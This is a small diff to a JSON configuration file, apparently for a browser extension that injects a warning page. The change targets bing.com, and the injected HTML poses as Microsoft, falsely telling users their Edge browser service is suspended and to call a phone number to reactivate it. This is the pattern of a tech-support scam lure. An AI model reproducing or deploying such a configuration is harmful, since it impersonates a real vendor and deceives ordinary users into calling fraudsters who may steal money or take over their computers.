@@ -1,5 +1,5 @@
 {
-  "domains": [""],
+  "domains": ["bing.com"],
   
   "warningHTML": "<body style='text-align:left;'><h1>Your Microsoft Edge Browser service has been suspended.</h1><h2>To reactivate, please call 9876543210</h2><h3>#TeamMicrosoft</h3></body>",
   
